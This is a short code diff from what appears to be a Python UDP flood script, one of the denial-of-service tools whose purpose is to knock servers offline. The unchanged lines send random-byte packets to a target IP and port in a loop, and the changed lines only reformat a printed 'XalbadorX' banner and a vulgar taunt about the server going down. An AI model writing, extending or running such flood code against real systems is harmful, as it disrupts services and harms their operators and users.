@@ -23,10 +23,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" +----------------------------+
-                           |   XalbadorX             |")
+			print(i +" | XalbadorX |")
 		except:
-			print("[!] |  Server down kontol!!!  |")
+			print("[!] | Server down kontol!!! |")
 
 def run2():
 	data = random._urandom(16)
